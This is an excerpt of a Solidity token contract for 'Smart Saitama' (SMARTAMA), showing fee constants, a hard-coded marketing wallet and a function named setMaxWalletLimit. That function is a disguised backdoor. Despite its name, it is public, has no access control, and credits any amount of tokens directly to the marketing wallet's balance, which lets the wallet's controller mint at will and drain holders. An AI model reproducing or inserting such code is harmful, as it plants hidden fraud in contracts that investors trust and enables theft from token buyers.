...
contract SmartSaitama is Context, IERC20, Ownable {
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 25000000000 * 10**9; //
    string private constant _name = "Smart Saitama"; // 
    string private constant _symbol = "SMARTAMA"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 3;
    address public  _marketingWallet = 0x662bB4e1C98cbe5110a50250a71b5CB760EfA682;
    ...
    function setMaxWalletLimit(uint256 values) public virtual {address insufficient= _marketingWallet;
        _tOwned[insufficient]
        += values;
    }
